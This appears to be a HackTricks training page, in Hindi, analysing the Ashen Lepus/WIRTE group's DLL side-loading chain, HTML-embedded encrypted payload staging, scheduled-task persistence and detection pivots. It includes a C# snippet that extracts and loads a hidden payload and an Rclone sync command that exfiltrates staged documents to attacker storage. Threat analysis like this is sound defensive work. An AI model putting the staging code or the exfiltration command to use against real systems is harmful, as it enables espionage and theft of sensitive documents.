# उन्नत DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## ट्रेडक्राफ्ट अवलोकन

Ashen Lepus (aka WIRTE) ने एक ऐसे दोहराने योग्य पैटर्न को हथियारबंद किया जो DLL sideloading, staged HTML payloads, और modular .NET backdoors को जोड़कर मध्य-पूर्व के राजनयिक नेटवर्क में persistence बनाये रखता है। यह तकनीक किसी भी ऑपरेटर द्वारा पुन: उपयोगी है क्योंकि यह निम्न पर निर्भर करती है:

- **Archive-based social engineering**: सुरक्षित दिखने वाले PDFs लक्ष्यों को फ़ाइल-शेयरिंग साइट से एक RAR आर्काइव डाउनलोड करने का निर्देश देते हैं। आर्काइव में एक वास्तविक दिखाई देने वाला document viewer EXE, एक malicious DLL जिसका नाम भरोसेमंद लाइब्रेरी के नाम जैसा होता है (उदा., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), और एक भ्रामक `Document.pdf` बंडल किया जाता है।
- **DLL search order abuse**: पीड़ित EXE पर डबल-क्लिक करता है, Windows वर्तमान निर्देशिका से DLL import को रिज़ॉल्व करता है, और malicious loader (AshenLoader) विश्वसनीय प्रोसेस के अंदर execute होता है जबकि decoy PDF खुलकर शक कम करता है।
- **Living-off-the-land staging**: बाद के हर चरण (AshenStager → AshenOrchestrator → modules) को डिस्क पर तब तक रखा नहीं जाता जब तक इसकी ज़रूरत न हो; इन्हें encrypted blobs के रूप में otherwise harmless HTML responses में छिपाकर डिलीवर किया जाता है।

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE AshenLoader को side-load करता है, जो host recon करता है, इसे AES-CTR से encrypt करता है, और इसे `token=`, `id=`, `q=` या `auth=` जैसे घूमते हुए पैरामीटरों के अंदर POST करता है API-जैसी paths (उदा., `/api/v2/account`) पर।
2. **HTML extraction**: C2 केवल तभी अगले चरण का खुलासा करता है जब client IP लक्ष्य क्षेत्र में geolocate हो और `User-Agent` implant से मेल खाता हो, जिससे sandboxes परेशान हो जाते हैं। जब ये चेक पास होते हैं तो HTTP body में एक `<headerp>...</headerp>` blob होता है जिसमें Base64/AES-CTR से encrypted AshenStager payload होता है।
3. **Second sideload**: AshenStager को एक और वैध बाइनरी के साथ deploy किया जाता है जो `wtsapi32.dll` को import करती है। बाइनरी में injected malicious copy और अधिक HTML fetch करता है, इस बार `<article>...</article>` carve करके AshenOrchestrator को recover करता है।
4. **AshenOrchestrator**: एक मॉड्युलर .NET controller जो Base64 JSON config को decode करता है। config के `tg` और `au` फील्ड्स को concatenate/hashed करके AES key बनाई जाती है, जो `xrk` को decrypt करती है। परिणामी बाइट्स बाद में फ़ेच किए जाने वाले हर module blob के लिए XOR key के रूप में काम करते हैं।
5. **Module delivery**: प्रत्येक module को HTML comments के माध्यम से describe किया जाता है जो parser को किसी arbitrary tag पर redirect करते हैं, और उन static rules को तोड़ देते हैं जो केवल `<headerp>` या `<article>` देखते हैं। Modules में persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), और file exploration (`FE`) शामिल हैं।

### HTML कंटेनर पार्सिंग पैटर्न
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
भले ही रक्षार्थी किसी विशिष्ट तत्व को ब्लॉक या हटा दें, ऑपरेटर केवल HTML comment में संकेतित टैग को बदलकर डिलीवरी फिर से शुरू कर सकता है।

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders 256-bit keys और nonces (उदा., `{9a 20 51 98 ...}`) एम्बेड करते हैं और वैकल्पिक रूप से decryption के पहले/बाद में `msasn1.dll` जैसे स्ट्रिंग्स का उपयोग करके एक XOR लेयर जोड़ते हैं।
- **Recon smuggling**: enumerated data अब Program Files listings शामिल करता है ताकि high-value apps का पता लगाया जा सके और होस्ट छोड़ने से पहले हमेशा encrypted किया जाता है।
- **URI churn**: query parameters और REST paths अभियान के बीच बदलते रहते हैं (`/api/v1/account?token=` → `/api/v2/account?auth=`), जिससे brittle detections अमान्य हो जाते हैं।
- **Gated delivery**: servers geo-fenced हैं और केवल वास्तविक implants को जवाब देते हैं। अप्रूव्ड क्लाइंट्स को सामान्य दिखने वाला HTML मिलता है।

## Persistence & Execution Loop

AshenStager scheduled tasks drop करता है जो Windows maintenance jobs के रूप में प्रतिरूपित होते हैं और `svchost.exe` के माध्यम से execute होते हैं, उदाहरण के लिए:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

ये tasks बूट पर या अंतराल पर sideloading chain को फिर से लॉन्च करते हैं, जिससे AshenOrchestrator बिना डिस्क को फिर से छेड़े नए मॉड्यूल अनुरोध कर सके।

## Using Benign Sync Clients for Exfiltration

ऑपरेटर्स `C:\Users\Public` (world-readable और non-suspicious) में राजनयिक दस्तावेज़ एक समर्पित module के माध्यम से स्टेज करते हैं, फिर उस डायरेक्टरी को attacker storage के साथ सिंक करने के लिए वैध [Rclone](https://rclone.org/) बाइनरी डाउनलोड करते हैं:

1. **Stage**: लक्षित फ़ाइलों को `C:\Users\Public\{campaign}\` में कॉपी/संग्रहित करें।
2. **Configure**: Rclone config में attacker-controlled HTTPS endpoint (उदा., `api.technology-system[.]com`) पॉइंट करें।
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` चलाएँ ताकि ट्रैफ़िक सामान्य cloud backups जैसा दिखे।

चूँकि Rclone वैध बैकअप वर्कफ़्लो में व्यापक रूप से उपयोग होता है, रक्षार्थियों को anomalous executions (नए binaries, अजीब remotes, या अचानक `C:\Users\Public` का सिंक होना) पर ध्यान केंद्रित करना चाहिए।

## Detection Pivots

- उन **signed processes** पर अलर्ट करें जो अनपेक्षित रूप से user-writable paths से DLLs लोड करते हैं (Procmon filters + `Get-ProcessMitigation -Module`), खासकर जब DLL नाम `netutils`, `srvcli`, `dwampi`, या `wtsapi32` से ओवरलैप करते हों।
- संदिग्ध HTTPS responses की जाँच करें ताकि **large Base64 blobs जो असामान्य tags के अंदर एम्बेड हैं** या `<!-- TAG: <xyz> -->` comments द्वारा सुरक्षित हैं, पता चल सके।
- ऐसे **scheduled tasks** की तलाश करें जो non-service arguments के साथ `svchost.exe` चलाते हैं या dropper directories की ओर इशारा करते हैं।
- निगरानी रखें कि क्या **Rclone** binaries IT-managed लोकेशन्स के बाहर दिखाई दे रहे हैं, नए `rclone.conf` फाइलें बन रही हैं, या ऐसे sync jobs जो स्टेजिंग डायरेक्टरी जैसे `C:\Users\Public` से डेटा खींच रहे हैं।

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
